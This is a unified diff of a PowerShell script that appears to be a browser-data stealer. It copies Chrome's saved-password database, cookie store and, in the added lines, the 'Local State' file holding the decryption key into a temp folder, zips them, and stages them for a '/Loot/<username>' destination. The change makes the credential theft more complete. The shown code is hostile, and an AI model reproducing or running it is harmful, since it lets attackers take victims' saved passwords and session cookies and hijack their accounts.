@@ -11,6 +11,7 @@
 
 $GLoginPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 $GcookiesPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
+$GLocalStatePath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Local State"
 $GoogleFolderPath = "$env:tmp\Google-UserData\"
 $GfilePath = "$env:temp\Google-UserData.zip"
 $GdestinationPath = "/Loot/$env:USERNAME/Google-UserData.zip"
@@ -20,7 +21,8 @@ mkdir $env:tmp\Google-UserData
 #------------------------------------------------------------------------------------------------------------------------------------
 
 Copy-Item -Path $GcookiesPath -Destination $GoogleFolderPath -Force
-Copy-Item -Path $GLoginPath -Destination "$env:tmp\Google-UserData\Login Data.json" -Force
+Copy-Item -Path $GLoginPath -Destination $GoogleFolderPath -Force
+Copy-Item -Path $GLocalStatePath -Destination $GoogleFolderPath - Force
 Compress-Archive -Path $GoogleFolderPath -DestinationPath $GfilePath
 
 #------------------------------------------------------------------------------------------------------------------------------------
